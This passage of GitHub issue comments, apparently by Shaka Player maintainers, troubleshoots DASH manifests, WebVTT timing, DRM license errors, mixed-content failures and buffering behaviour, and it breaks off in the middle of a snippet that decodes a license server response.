investigate.  We need to make sure there's not some other pathology causing the repeated requests, and we need to make sure that ignoring small gaps will not cause some other problem elsewhere in the system.\n. @baconz, we believe this is fixed now.  Let us know if you have any further issues.\n. We decided against throwing.  There should be no fetch loop now that we have changed the way we compare against buffering goals.\n. Can you please provide a manifest URL with which I could reproduce this error?\n. @mlondon1, we cannot reproduce.  Can you provide a manifest URL that reproduces the error?\n. We need some way to reproduce your issue before we can solve it.  Can you provide instructions on how to reproduce the issue?\nUsually, a good repro involves a manifest URL and license server URL that can be used in the demo app.  If you can't provide those things publicly, you can always send me a private email with the details.  My email address can be found in CONTRIBUTORS.\n. Thanks for the manifest info.  I've tracked the bug down to here:\njs\nshaka.media.TtmlTextParser.getInheritedAttribute_ = function(\n    element, attributeName) {\n  var ret = null;\n  while (element) {\n    ret = element.getAttribute(attributeName);\nNow that we have repro, it should be easy to fix.  Thanks!\n. @mlondon1, please try again with the latest from master and let us know if you have any issues.\n. I definitely see what you mean.  It's not a good experience for playback not to start.\nDesign-wise, the trouble is that we treat all content types generically.  Video, audio, and text are all streamed exactly the same way, including buffering.  So when text is missing (404), we are stuck buffering, just like if audio or video was missing.\nAt a higher level, if subtitles fail to load for a piece of content, that's something an integrator needs to know early in their development process.  It shouldn't happen, and silently ignoring it leads to a bad experience for users who need text, such as non-native speakers and the deaf.  So I believe that we should not silently ignore text failures.\nI believe the negative impact on UX caused by failure to start playback is the fault of the application developer for giving the library an inaccessible or incorrect URL.  It's not at all obvious to the library that a given stream in a piece of content could be considered \"unimportant\" and allowed to silently fail.  And I don't think contentType == \"text\" is a good signal for that.\nTo sum up, we treat text as important because it is necessary for non-native speakers and the deaf.  We believe that application developers should feed the library good data, and that dispatching errors is the correct way to respond to being fed bad data.\nFor now, I'm marking this \"working as intended\", but we can continue to discuss alternatives if you like.\n. @MachalovaZuzana, @BucherTomas, I understand what you're saying, and I would like to find a solution for you.  To help me design a solution that meets everyone's needs, can you explain how/why external subs would be unavailable?  How does this situation arise?\n. @BucherTomas, how would you feel about making this behavior configurable, with the default being to behave as we do today?  To ignore text failures, you might do something like:\njs\nplayer.configure({\n  streaming: {\n    ignoreTextStreamFailures: true,\n  }\n});\n. Great, then we'll add that option for you.  Thanks for discussing!\n. @BucherTomas, can you clarify what the text is on the message you're seeing?  Also, is it an exception, an error log, or a warning?\n. We do support cookie authentication.  See the \"Cookie Authentication\" section of the \"License Server Authentication\" tutorial.  The filters in the tutorial are looking for license requests, but you could just as easily accept manifest and/or segment requests, too.\nShould we go ahead and close this feature request, then?\n. Okay, thanks for your feedback.\n. No.  In the year since this issue was closed, we've introduced asynchronous network filters (starting in v2.1, current release is v2.2.1), which are ideal for this type of authentication.  In short, you can delay a request while you fetch an authentication token, then attach the token and let the original request proceed.  There is a tutorial showing how this works:\nhttps://shaka-player-demo.appspot.com/docs/api/tutorial-license-server-auth.html\nYou should skim through the tutorial to find the section which applies to your form of authentication: parameters, headers, or cookies, whichever is appropriate to your application.  Then pay special attention to the section called \"Asynchronous Credentials\", which will show how best to fetch auth tokens.\nAlthough it is geared toward license server authentication, you can apply it to any requests, including segment or manifest requests.\nDoes that help?. @baconz, please try the latest from master and let us know how it's working for you.\n. I think as long as we're using <input type=\"range\">, the entire width of the scrubber will always be usable.  I don't believe we can say \"size as if it's 0-100, but reject 62-100\".\nTechnically speaking, we could render our own scrubber without using <input>, but we are not going to invest a lot into UI changes for the demo right now.\nSo I think the scrubber's range will just have to grow as the recording progresses, so that the user can't seek to an unavailable position.  You can, of course, do something sleeker for your own app.\nSound reasonable?\n. Better?\n. Okay, should be fixed now.\n. Given that clear key does not have to securely handle keys or decryption, I think it would be technically feasible to decode licenses in JavaScript and decrypt segments using WebCrypto.  But you would have to parse the segments in JavaScript and decrypt before they are passed to MediaSource, and that's not how the EME APIs work.\nSo although you could do clear key in JavaScript, it would be much more effort than it's worth, and I'm not sure it's feasible as a polyfill specifically.\n. If you want to see clear key in Safari, Edge, and IE, you can file bugs against those browsers.  Section 9 of the EME spec states:\n\nAll user agents MUST support the common key systems described in this section.\n\nSo those browsers are technically not in full compliance with the spec until they support clear key anyway.\n. Thanks for the links!  I'll keep an eye on those bugs.\n. To clarify, I do not believe you need a different key for each representation.  I believe you need a different key for each group of representations with different security requirements.\nFor example, if HD requires hardware security, UHD requires HDCP 2.x, and SD is available everywhere, then you need three different video keys.  If the security policies for video are the same regardless of resolution, you can have one video key.\nDifferent keys require different AdaptationSets according the DASH IOP docs, if I understand correctly.  Shaka supports AdaptationSetSwitching to indicate which sets should be grouped together for adaptation purposes.  Without this, only one video AdaptationSet will be used, so this is important.\nAlso, you should always have different keys for audio than video.  Audio is typically not protected as strongly video, so they should always use different keys.\n. As for license requests, Shaka Player can't know what's in the payload of the init data.  It has no access to any Widevine-specific fields, such as content ID.  From JavaScript, that's all opaque.\nShaka Player must make a license request for each unique init data because there is no way to know what exactly it contains.  So if your PSSHs are all different, we have to make multiple requests.\nIf Widevine init data contains a content ID that can be used by the server to look up all keys for that piece of content, then only one request should be necessary.\nInit data in the manifest overrides init data in the content.  If init data is present in the manifest, the init data in the content will be ignored by Shaka Player.\nSo the best thing you can do is use one consistent init data value containing a Widevine content ID.  That value should appear on every AdaptationSet in the manifest.  With this setup, Shaka Player will only make one license request.\n. Yes, the filtering logic in DrmEngine makes sure we only request licenses for unique PSSHs.  The init data in the manifest needs to be the entire PSSH, not just a content ID.\n. @kidmiracleman Is this still an issue for you or can we close it?\n. I would not expect the first cue in each segment to start at 0.  What packager are you using?\n. We treat them as absolute because that's how timestamps work in all other kinds of media segments.\n. Are you able to share any details on the encoder vendor or packager software you're using?\n. Sorry for the delay in my response.\nI ran into a small, unrelated issue with your manifest that caused us to ignore the WebVTT text:\nxml\n  <AdaptationSet mimeType=\"text/vtt\" ...>\n    <Representation codecs=\"vtt\" ... />\n  </AdaptationSet>\nOur parser is registered for text/vtt, but not text/vtt; codecs=\"vtt\".  This is easy to fix by registering the additional string.  I'll take care of this shortly.\nAs for the timestamps, we treat everything generically.  Since timestamps in video segments are relative to the period, so should text timestamps be.\nThe only exception to this so far has been WebVTT embedded in MP4.  The atom containing the cue does not actually contain a timestamp.  The format specifies that the cue time should be the segment time.  We treat this differently than the others because this is part of the spec.\nNow, looking at your text content, I see this:\n```\nWEBVTT\nX-TIMESTAMP-MAP=MPEGTS:2214643072,LOCAL:00:00:00.000\n00:00:00.000 --> 00:00:00.698 position:10%,start align:left line:19%\nSO WE HAVE A CHANGE OF THE\n```\nI researched X-TIMESTAMP-MAP, and it seems to be an HLS extension and not part of the WebVTT spec.  This page from BrightCove states:\n\nAdding the X-TIMESTAMP-MAP header may cause inconsistencies on other platforms, such as Windows Mobile applications. Make sure to test across all platforms after adding the offset header. The addition of this header tag is an HLS spec requirement, and not a WebVTT spec parameter.\n\nI think it makes more sense to add support for X-TIMESTAMP-MAP than to add a configuration option to decide if timestamps are relative or not.  Thoughts?\n. Actually, no, that won't work after all.  As I'm looking more closely at the numbers, the map in the WebVTT files don't match up to the DASH presentation timeline at all.\nFor example, the segment at time 144323839, timescale 1000 contains a map that says it should be offset to 2560783072.  Comparing numbers across segments, I see that 1k in the DASH timescale seems to equal 90k in the MPEG2 timescale used by whatever generated the VTT.\nI'm increasingly convinced now that these timestamps are something the encoder needs to fix.  They are taking something meant for HLS and just serving it as DASH, which doesn't make sense.  Have you reached out to them for support?\n. Thanks, Sander.  It appears that we only have one demo asset that violates this part of IOP v3.3, and it's one we created for testing: http://storage.googleapis.com/shaka-demo-assets/tos-pto-webvtt/dash.mpd\njs\nshakaAssets.testAssets.filter(function(a) {\n  return a.features.includes(shakaAssets.Feature.SEGMENTED_TEXT) &&\n      !a.features.includes(shakaAssets.Feature.EMBEDDED_TEXT);\n});\nSince that's our own home-made test asset, we can change it to align with whatever we determine is the best practice for this non-IOP-compliant situation.\nDoes anyone have examples of public test content that features segmented text not embedded in ISO-BMFF?  I'd like to do a survey of what's out there before we make any changes.\nIf you can provide a test stream, please do.  If you can't, please just state whether your segments' cue times are relative to the period or to the segment.  Also, please state what encoder/packager you use.\n. @baconz, I see you on the ExoPlayer thread.  Can you weigh in on this?\n. Okay.  There were literally zero responses to my attempted survey on the mailing list.  We will change to segment-relative timestamps in v2.1.0.  PRs are welcome, or we'll get to it ourselves, eventually.\n. Sure, that could work.  If we introduce a setting for this, we could even put it into v2.0.x (default to current behavior, warn about impending deprecation when used).  Then in v2.1.0 we could just remove the setting.\n. If the license response was rejected by the CDM, you probably made a mistake in your license server proxy somehow.  The system code 28 refers to the reason the response was rejected, but the meaning of these Widevine codes has not been published as far as I know.\nIf you can provide a hex dump of the license response, I may be able to get someone to analyze it and get back to you.  Would that work?\n. @randeeppr, I am able to generate system code 28 by using a proxy which passes an invalid key to the license server backend.  Please make sure your keys and key IDs are 128 bits and are encoded in base64.\n. Thanks for catching this!\nThis should apply equally to SegmentList's evict call.  Also, it appears shaka.dash.SegmentList.createSegmentReferences_ has an unused periodStart parameter that should be dropped.\nYou should also add tests to test/dash/dash_parser_live_unit.js.  It looks like a multi-period variant on \"evicts old references\" would be in order.\n. Looks good to me.  Thanks!\n. Take a look at lib/dash/dash_parser.js and the rest of lib/dash.  If you want to create a pull request for this, I'd be happy to review it.\n. Oh, and I should have mentioned, the parser can put the license server URL into the manifest output directly.  No need to modify the config.\n. <ms:laurl> is a Microsoft-specific extension.  In general, a web-based client should know its own endpoints, but some end-to-end DASH implementations will put information like this into manifest extensions for convenience.  YouTube does this, for example, but with a different extension.\nAs a generic client, Shaka Player does not parse any of these extensions directly.  However, we do support extensions to <ContentProtection> with an application callback.  So as long as the license server URL is in an extension to <ContentProtection>, applications can already parse these and provide detailed DRM information to Shaka through the callback.\n. Is there general interest in us adding ms:laurl support directly in the DASH parser?  Please speak up and tell us if this is important, so we can schedule it accordingly.\nIn terms of behavior, should ms:laurl override the player's config?  Or vice-versa?  My inclination is for player config to take precedence, so you can override bad content, but I could be wrong.. Okay.  I'll update the issue title to include both ms:laurl and ms:pro.  Tentatively scheduled for v2.3.0.. If HDCP is required (required_output_protection in the policy) but not available (external DVI display), I would expect playback to fail and I would expect the error to be RESTRICTIONS_CANNOT_BE_MET.\nUnfortunately, because it operates at the JavaScript level, Shaka Player has no visibility into policy settings in the license and no visibility into the availability of HDCP on the device.  Both HDCP validation and license policies are handled by the CDM.  We signal RESTRICTIONS_CANNOT_BE_MET when the browser tells us that the keys are restricted.\nAs for persistent state, have you specified that persistent state is required in Shaka Player's configuration?  That should be set before you load the content:\njs\nplayer.configure({ drm: { advanced: {\n  'com.widevine.alpha': {\n    persistentStateRequired: true,\n  },\n}}});\n. @dsilhavy Are you still having HDCP issues?\n. Closing due to inactivity.\n. @ajbeach2, this is working as intended.  If you don't have the required codecs, you can't play the content.  If you take a look at the docs for shaka.util.Error, you'll see that error 4011 is UNPLAYABLE_PERIOD:\n\nThe manifest contains a period with no playable streams. Either the period was originally empty, or the streams within cannot be played on this browser or platform.\n. This was added as a work-around for a compiler issue.\n\nWhen we merge configuration changes from the app into the running config, we check types to make sure that everything is correctly-typed.  For functions, this means checking the number of arguments.\nWe used to have this:\njs\n  customScheme: function(node) {},\nBut this only worked in uncompiled mode.  The compiler would strip out unused arguments from the anonymous function, which caused the check on the number of arguments to fail.\nWe started using new Function('node', '') so the compiler would not \"optimize\" it.  In reality, we don't need to convert a string to a function at all.\nSo yes, we can change this.  I don't yet know what other work-around we should use, but we will investigate our options.\n. No worries.  We should be able to support this.\n. @voltan, can you please explain what the problem is?  Here's a checklist for writing a bug report:\n1. Steps to reproduce the problem, including URLs of any necessary apps, manifests, or license servers\n2. Expected behavior\n3. Actual behavior\n. @voltan, can you please provide us with details to reproduce your issue?\n. What do you mean by \"navigation not work true\"?  This phrase does not mean anything to me.\nPlease provide the following information so that we can understand the issue, reproduce the issue, and help you fix it:\n1. Specific steps to reproduce (for example, \"load the page, click play, seek to time 5, etc\")\n2. Expected behavior (for example, \"the video should seek to time 5\")\n3. Actual behavior (for example, \"instead of seeking to time 5, the video seeks to time 50\")\n. @voltan, we really want to help you.  It would have been much easier to help you if you had given us the information we asked for.  In your wowza forum post, you mentioned that the player fails when you load it via HTTPS, but not in plain HTTP.  This is critical information that you did not give us here.  In fact, when you linked us to your page, your link was plain HTTP, not HTTPS.\nWhen I go to the HTTPS URL https://www.cafeyab.com/wowza.html I can see the problem immediately.  The video never loads.  (This would also be a useful description of the problem.)\nLooking at the JS console in Chrome, the problem is immediately obvious.  I see these error messages:\n\nMixed Content: The page at 'https://www.cafeyab.com/wowza.html' was loaded over HTTPS, but requested an insecure XMLHttpRequest endpoint 'http://74.84.137.41:1935/faragostaresh/definst/mp4:cafeyab/video/2016/09/media-57ca5d223d635.mp4/manifest.mpd'. This request has been blocked; the content must be served over HTTPS.\n\nHere, Chrome is telling you exactly what went wrong and how to fix it.  If the page is served over HTTPS, everything else must be over HTTPS, too, for security.  Browsers require this, not Shaka Player, and not Wowza.\nHere is a page on MDN that explains all about mixed content, what it means, and why it can be dangerous:  https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\nThe solution is to serve everything (page, manifest, media) over SSL.\n. The video tag has built-in controls if you set the controls attribute on the tag.  If you omit controls, the browser built-in controls do not show up.\nThe player library does not have its own custom controls as part of the library.  The demo app does have custom controls, but they live outside the library.\nThe demo app controls have three parts: some HTML in demo/index.html to define the layout, CSS in demo/controls.css to define the style and positioning on to of the video, and demo/controls.js contains the logic.\nIf you want the built-in controls from the browser, use <video ... controls>.  If you want custom controls, omit the controls attribute.\nIf you want to use the custom controls from our demo app, make sure you are using all three pieces.  We don't offer support for the demo app controls outside of the demo app, since it's not part of the library.  However, you can use the demo app as a working example of how to set up these controls.  Don't forget to include the JavaScript and CSS, and don't forget to initialize them:\njs\nvar myControls = new shakaControls();\nmyControls.init(castProxy, onError, onCastStatus);\n. MEDIA.VIDEO_ERROR corresponds to a decoder failure.  Check chrome://media-internals for details on the decoder error.  JavaScript has no visibility into why this failed.\nThis usually means that your content is not compatible with the browser's decoder in some way.  Often this means the content is broken, but occasionally the same content will play on other platforms.  What OS are you on?  There are some known issues with some content failing in the platform's decoder on Mac.\n. Please check chrome://media-internals for details on the decoder error.\n. The blocks and green bands are caused by a decoder failure.  You can get details from the browser by going to chrome://media-internals and clicking the button which corresponds to the value of video.src in your app.  When you click that button, you should see logs from the media pipeline.  Report that information to your encoder vendor.\nDecode is outside the control of JavaScript and therefore Shaka Player.  If your content can't be decoded, you will need to report that to the maker of the software that encoded your content.\n. @randeeppr Is there anything else we can do for you on this?\n. Since the regression (suggestedPresentationDelay) was fixed, I'm closing the issue.\n@johanhil, let us know if there's anything else we can do for you.\n. Hi Christoph,\nPlease test with different versions of Shaka Player to see if it worked on some other version:\nhttp://nightly.shaka-player-demo.appspot.com/\nhttp://v2-0-0-beta3.shaka-player-demo.appspot.com/\nhttp://v2-0-0-beta2.shaka-player-demo.appspot.com/\nhttp://v2-0-0-beta.shaka-player-demo.appspot.com/\nhttp://v1-6-5.shaka-player-demo.appspot.com/\nhttp://v1-5-2.shaka-player-demo.appspot.com/\nhttp://v1-4-2.shaka-player-demo.appspot.com/\nhttp://v1-3-2.shaka-player-demo.appspot.com/\nThat's the easiest way to check if there is a regression.  Thanks!\n. Just looking at Shaka's output, it seems that v2 misunderstands the seek range somehow.  v2 wants to start playback at 0, while v1 starts at 625199, for example.  We'll look into it.\nWill this manifest URL continue to be valid for us for testing while we work on a fix?\n. It appears this manifest is broken.  availabilityStartTime is always changing, which does not make sense.  v2 has a strict interpretation of live edge, which we do to keep the code maintainable.  In v1, we were able to detect and ignore invalid availabilityStartTime values, but this was complex and ultimately a bandaid on top of invalid content.\n. As far as we can tell, this manifest does not use availabilityStartTime correctly.  We need AST to be correct in order to play live streams correctly.  It's not an edge case.\nIn v1, we tried to figure out what the encoder \"meant to do\", which was both complex and error prone.  In v2, we expect the manifest to be correct.\n. Please let us know if there's anything else we can do for you.  Closing the issue for now.\n. A workaround already exists in v2.  See the code next to the comments that say \"Workaround Safari bug\" in shaka.media.TimeRangeUtils in lib/media/time_range_utils.js.\nIf you want to backport this fix to v1.6.x and make a pull request, I will be happy to review it.  Otherwise, I recommend upgrading to v2, which is nearly out of beta.  An upgrade guide is available in the docs.\n. Shaka Player runs on top of the MSE standard and can only play consent using containers supported by the browser.  No browser supports wvm natively, so this is not possible with Shaka Player.  Sorry.\n. I believe Shaka Packager can transmux wvm to DASH, though, so that may be an option for you.\n. I'm sorry, but you're mistaken.  Shaka Player has never supported Widevine Classic for the reasons stated above.  We can only support content in containers supported by the browser, and no browser has ever natively supported Widevine Classic content.\nYou can easily access the demo pages of older versions of Shaka Player if you are skeptical.  Here's a link to v1.6.5 .\n. No worries!  We're always happy to help.\n. Why are you calling player.selectTrack() in the first place?  It's not clear what you're trying to accomplish.  If you can explain to us what your use case is, we can recommend how to go about it or consider enhancements to meet your needs.\nBy default, the player should be making ABR decisions for you.  In fact, because of that, player.selectTrack() disables ABR to turn control over to the app.\nThink of it like this: if your app has a resolution UI, and the default setting is \"auto\", the player will decide how and when to switch resolutions.  If the user changes from \"auto\" to \"720p\", you call player.selectTrack(...).  And since the user clicked that button, they probably want to see that change immediately, so you pass true for the second argument.  If the user changes back to \"auto\", you call player.configure({abr: {enabled: true}}) to return control to AbrManager.\nDoes that make sense?\n. What you're doing is definitely not what tracks were designed for.\nThe player feeds segments to MediaSource and the browser handles decode and render.  The video element can tell you what resolution it is currently displaying, so in the case of tracks representing different resolutions, that is the indication of what track is being rendered right this moment.  The player really only knows what track is selected, and fetches new segments from that track.\nThe only way you can know what is being rendered right now without relying on resolution is to clear the buffer any time you switch tracks.  Then the thing being rendered is always what is selected.  This has drawbacks.\nIf you clear ahead of the playhead but very close to the playhead, you can encounter buffering or in some browsers just a visual stutter.\nIf you clear everything, you will definitely buffer, but there is no undue or unpredictable visual stuttering.  And if you control the content encoding, you can significantly reduce the amount of buffering.  I recommend 2-second segments and a minBufferTime of 2s.  This will allow the player to resume relatively quickly when you change tracks.\nYou simply can't have a seamless transition that is also immediate.  No browser gives you the ability to do that today.  But with small segments and a low minBufferTime, you can make it as good as possible.\n. MediaSource doesn't download anything.  The app's JavaScript does that.  In Shaka Player, that's StreamingEngine via NetworkingEngine via XMLHttpRequest.  So Shaka Player is always in control of what we download when, and we feed those downloaded segments to MediaSource to be decoded and displayed.\nThe problem is that your ideal API of \"switch now\" doesn't exist.  You can feed segments to MediaSource, and you can clear some range of buffered content.\nWhen you feed a segment to MediaSource that overlaps with something already buffered, you don't have control over what gets displayed.  The browser may show the new data right away, or it may continue to show the old data until a keyframe, or until a segment boundary, or until the old data runs out.  In JavaScript, there's no visibility into this, and no control over the decision.  It's up to the browser's implementation.\nWhat we've found in practice is that to get a smooth transition in most browsers today, you must either:\n1. Avoid overlapping data, OR\n2. accept an unknown latency for the transition, OR\n3. clear some data from the buffer to force that transition.\nAvoiding overlapping data saves you bytes.  You don't download any time range you don't already have.  But if you've already buffered, say, 30s, you can't upgrade the visual quality for that long.\nYou can download overlapping data starting at the current time, but that gets tricky.  At 10s into the clip, you have buffered ahead 30s more (up to 40s).  You find you have just enough bandwidth to keep up with 720p, so you start downloading 720p at 10s.  By the time you've downloaded the 10s segment from 10-20, the play head is now at 20s.  You'll never get ahead of the old data to see that change happen, and at 40s you'll go into a buffering state.\nIf you clear all the buffered data, you'll see a stutter that lasts as long as it takes to download minBufferTime of data, but the upgrade is immediate.\nThere is a trick to get the transition latency lower by calling abort() without any operations running.  According to spec, this should reset the decoder so that it is ready to parse the new data and replace the old data right away.  But this only works on Chrome, Opera, and Firefox.  On IE & Edge, this has no effect, so you see a very noticeable stutter when the transition happens.  On Safari, it throws an error and refuses to decode any more.\nWhat we have found to be the best balance is to clear everything about 10s ahead of the play head, which generally covers one segment or more.  IE and Edge seem to transition without a visual stutter so long as you leave at least one segment in buffer.  This keeps the transition latency down to 10s.  We still call abort() to reset the decoder on Chrome, Opera, and Firefox.  On Safari, we avoid calling abort().\nThis is the most complex thing about MediaSource as far as I can tell, and largely because of implementation differences.\nBecause Shaka is meant to adapt between different Representations of the same visual content, a little latency is acceptable.  The change is typically not driven by the user and the latency doesn't interrupt the user's experience at all.\nFor your case, you are switching between different visuals, and at the user's request.  So you want the lowest possible latency.  Sadly, you can't have that without at least a little interruption.  The best way you can minimize latency and minimize visual interruptions is to reduce the segment size and minBufferTime as much as possible and to completely clear the buffer when you switch.  I recommend 2s segments and 1.5s minBufferTime.\n. Happy to help.  Good luck with your project!\n. Thanks for the PR!\nIt seems like this could all be much cleaner if pushed into FailoverUri.  Perhaps you could try that?\n. Closing due to inactivity.  If you are interested in resuming this work, we can reopen it.\n. To clarify: you don't have to change anything on your server.  But your client and server must be in sync for live streaming to work correctly.\nClock sync worked differently in v1.6.5 than in v2.  In v1, clock sync was implicit and hacky.  We used a Date header on the manifest for clock sync, which had two critical disadvantages:\n1. introduces potential CORS problems that the app can't directly control\n2. some servers do not return the current time in the Date header, but rather the creation time of the file, which can actually make clock sync worse\nIn v2, clock sync is explicit.  Either the manifest specifies the clock sync method via a UTCTiming element, or the app configures the clock sync endpoint using .manifest.dash.clockSyncUri in the player config.  Either way, the choice is explicit and in the app's control.  (Our demo app performs clock sync against our own appspot server so that we can demo third-party live manifests.)\nIf you don't have clock sync configured through one of these two methods, Shaka Player will emit warnings to tell you that this is a problem you should address.\n. Can you provide a public manifest URL we can use to reproduce?  That will be much easier than trying to use the zip file you attached.  If you can't publish the URL, feel free to get my email address from CONTRIBUTORS and email it to me privately.\nCan you provide a debug log of your issue?  Use this URL and open the JS console to collect the log: https://shaka-player-demo.appspot.com/demo/?debug\n. So far there appears to be a MediaSource bug or perhaps decoder bug in Safari.  There are hundreds of gaps in the timeline on Safari only a few minutes after starting the stream.  Playback is stalled out and the playhead quickly gets far behind the seek range.  None of these issues show up on Chrome.\n. @DanielBaulig, @iw1000, were you able to resolve these content issues?  Were any bugs filed with Apple?\n. What do you mean by \"recursive download\"?  Can you provide a manifest URL that reproduces the issue?\n. \"Recursive download\" is not a term that means anything to me.  What I observe using the latest nightly build is that we buffer 30s of content (the default).  Since your clip starts at 1.4s, we appear to be buffering from 1.4s to 31.4s.\nContent should always start at zero.  From Shaka's point of view, this is badly-packaged content.  This could be corrected by using presentationTimeOffset in the manifest.  You could also use the optional startTime parameter in player.load() as a workaround to start playback at 1.5s.\nI also noticed one other odd thing about your manifest.  According to the DASH spec, the lang attributes in the manifest contain a language code, not a language name.  For example, in your manifest I see lang=\"English\" and lang=\"\u0420\u0443\u0441\u0441\u043a\u0438\u0439\".  These should be lang=\"en\" and lang=\"ru\" respectively.\nI strongly recommend that you report these two bugs (non-zero start time, language codes) to whomever wrote your encoder/packager software.  Please let us know if we can do anything else to help.\n. These streams exposed the issue: https://github.com/Axinom/dash-test-vectors/issues/1#issuecomment-243039762\n. @baseballbrad3, this has been verified via integration tests running on IE11.  Let us know if there are any issues with this change in your own app.\n. We definitely support multicontainer/multicodec content, but different container types must be in different AdaptationSets.  Please check for updates from Wowza, and if this is still the way manifests are generated in the latest version, you should report this to Wowza as a bug.\nWe have several examples of this in our demo assets.  Anything under the \"Shaka\" section in the asset list with \"multicodec\" in the description contains both WebM/VP9 and MP4/H.264.  All of those assets were created with our sister project, Shaka Packager.  Shaka Packager always puts different containers into different AdaptationSets.\nThe meaning of an AdaptationSet is that it is a set of things you can seamlessly adapt between.  That means containers and codecs must be compatible, and that is why they must appear in different AdaptationSets.\nThe DASH spec does not acknowledge WebM, and WebM DASH is an extension to that spec.  However, DASH IOP (Inter-Operability Points) v3.0, section 3.2.10.2 states:\n\nAdaptation Sets shall contain Media Segments compatible with a single decoder ... when multiple Representations are present. \n\nHope that helps!\n. Yes, exactly right.  AAC, Vorbis, Opus are not using the same decoder.  Same for AVC, HEVC, VP8, VP9.  So each of those should get its own AdaptationSet.  Variations in AVC profile are okay in the same AdaptationSet because they use the same decoder.\n. That makes sense.  I agree with your interpretation of the spec.  I found a live stream that behaves as you described, and your suggested solution seems to work well, too.\n. Looks like a video segment is being appended to the audio buffer.  Not sure why.  Thanks for the report!\n. This is caused by your audio Representation having the same id as one of your video Representations.  We keep a map internally of ids to segment indexes, which is necessary for us to update manifests for live streams.  Shaka v1 ignored manifest IDs, but that made updates more complicated.  This is why your content plays in v1, but not in v2.\nIt's not clear yet if your manifest is out of spec.  I will consult the DASH spec.  If this is valid, we will try to fix the library.  Otherwise, you will need to fix your content.\n. This content is out of spec.  Regarding Representation IDs, the DASH spec (ISO/IEC 23009-1:2014) says in section 5.3.5.2:\n\nspecifies an identifier for this Representation. The identifier shall be unique within a Period\n\nIn your content, there are two Representations with the same ID in the same Period.  If you are not the author of the encoder/packager, please report this as a bug to your encoder vendor.  Let us know if we can help in any way with your bug report.  Thanks!\n. The error you're getting is a mixed content error.  Here's a repro:\nhttps://shaka-player-demo.appspot.com/demo/?play;asset=http://dash.edgesuite.net/akamai/test/caption_test/ElephantsDream/elephants_dream_480p_heaac5_1.mpd\nNote that the player is HTTPS, but the manifest is HTTP.  Here's a link to learn more about mixed content, and why browsers don't let you do it: https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\nIf I load both player and manifest over plain HTTP, I see the error INVALID_TEXT_SETTINGS:\nhttp://shaka-player-demo.appspot.com/demo/?play;asset=http://dash.edgesuite.net/akamai/test/caption_test/ElephantsDream/elephants_dream_480p_heaac5_1.mpd\nThis appears to be caused by your VTT captions, specifically this line:\n00:01:16.042 --> 00:01:18.083 A:start S:25%\nThe abbreviation of \"align\" to \"A\" and \"size\" to \"S\" is out of spec.  See https://w3c.github.io/webvtt/#cue-settings for correct formatting.\n. Most browsers only support WebVTT natively, while a few others only support TTML natively.  We parse cues ourselves and feed them to the browser's TextTrack.  That way, we can support the same set of text formats (WebVTT and TTML, in text or in MP4) regardless of what the browser supports natively.\nThe INVALID_TEXT_SETTINGS exception is thrown by the VTT parser in Shaka Player.  shaka.media.VttTextParser.parseSetting fails to parse the settings, returns false, and shaka.media.VttTextParser.parseCue_ throws the exception.\n. We could always log a warning and ignore bad settings instead of emitting an error.  Would that be helpful?\n. Ping!  @robwalch, would it be helpful to log and ignore when we encounter bad settings?  Or are we okay with dispatching an error?\n. Okay, can do.\n. @esteban-dosztal, please add a test case in test/media/vtt_text_parser_unit.js.  You can run tests with ./build/test.py.  Also, please read CONTRIBUTING.md and add yourself to AUTHORS and CONTRIBUTORS.  Thanks for the contribution!\n. No, master branch was correct.\n. Oh, I see, you meant your master branch.  That part really doesn't matter to us.  As long as you're merging into our master.  We fork at each .0 release and merge cherry-pick bugfixes into the fork.\n. Understood.  It's a design flaw we didn't spot before it was reported, and we have been working on a fix ever since.  We will release an update as soon as a well-tested fix is available.\n. Hi @sridhard,\nThe demo app supports storing clear and encrypted content, so long as the browser has the necessary features.\nStorage of content for offline is supported on all major browsers if I recall correctly.\nHowever, Chrome does not support persistent licenses on desktop platforms at this time.  That is separate from the web API Shaka uses to store content itself, so you can still store clear content on desktop Chrome.  But without the ability to store the license, Shaka Player will not allow you to store encrypted content itself.  Without a license, you would not be able to play the encrypted content anyway.\nChrome currently only supports persistent licenses on Chromebooks.  I do not know when Chrome will start offering persistent license support on desktops, but when they do, Shaka Player will not need to be upgraded to take advantage of it.\nThere is one other important restriction on offline storage: Shaka Player does not allow you to store live streams offline, because some segments may not be available.\nDoes that help?\n. License responses cannot generally be cached.  They must match a specific request.\nShaka Player supports offline playback of both clear and encrypted content through standard APIs.  Not all browsers/platforms support persistent licenses yet, so those browsers can only do clear content offline at this time.\nCurrently, Chrome on ChromeOS supports persistent licenses.  Chrome on Android does not yet support persistent licenses, even though native apps on Android do.  Chrome on desktop does not support persistent licenses yet either.\nIf you are just using persistent licenses to avoid fees, that's not really what that technology is for.\n. Chrome 64, with persistent license support on Mac & Windows, is in beta.  Shaka-based applications will not need to be updated to take advantage of this feature in Chrome.\nI'm going to go ahead and close this bug, but please feel free to reply with any questions you might have about this.. Persistent licenses are now in Chrome 64 on Windows and Mac.. Hi @YingChen-dci,\nThe error NO_LICENSE_SERVER_GIVEN means that you did not specify a license server in Shaka Player's configuration.  Unless you tell us where to send license requests, we can't possibly know.  See the DRM Configuration tutorial for examples and more information.\n. LICENSE_RESPONSE_REJECTED means the license response was rejected by the CDM.  The CDM considered it invalid for some reason, and system code 13 is a number indicating why.\nI believe in this case, your response is malformed.  Is your server returning base64 or JSON or something instead of the raw response?\n. Sorry, that's not what I meant.  I meant the license response, the HTTP response from your license server.  Your server is giving output that is in the wrong format.  Can you share a copy of that output with me?\n. I've edited your last post and trimmed out the irrelevant parts of the log to show you which part is the response (UpdateCall log).\nI copied the decimal response bytes and converted them into a string like so in Python:\n``` python\ndec=\"\"\"    60,33,68,79,67,84,89,80,69,32,72,84,77,76,32,80,85,66,76,73\n    67,32,34,45,47,47,87,51,67,47,47,68,84,68,32,72,84,77,76,32\n    51,46,50,32,70,105,110,97,108,47,47,69,78,34,62,10,60,104,116,109\n    108,62,10,32,60,104,101,97,100,62,10,32,32,60,116,105,116,108,101,62\n    73,110,100,101,120,32,111,102,32,47,112,114,111,120,121,60,47,116,105,116\n    108,101,62,10,32,60,115,99,114,105,112,116,32,116,121,112,101,61,34,116\n    101,120,116,47,106,97,118,97,115,99,114,105,112,116,34,32,115,114,99,61\n    34,104,116,116,112,58,47,47,103,99,46,107,105,115,46,115,99,114,46,107\n    97,115,112,101,114,115,107,121,45,108,97,98,115,46,99,111,109,47,66,68\n    55,49,66,54,52,52,45,57,49,66,55,45,52,57,52,52,45,65,53,55\n    49,45,48,49,67,51,68,53,55,48,53,52,51,48,47,109,97,105,110,46\n    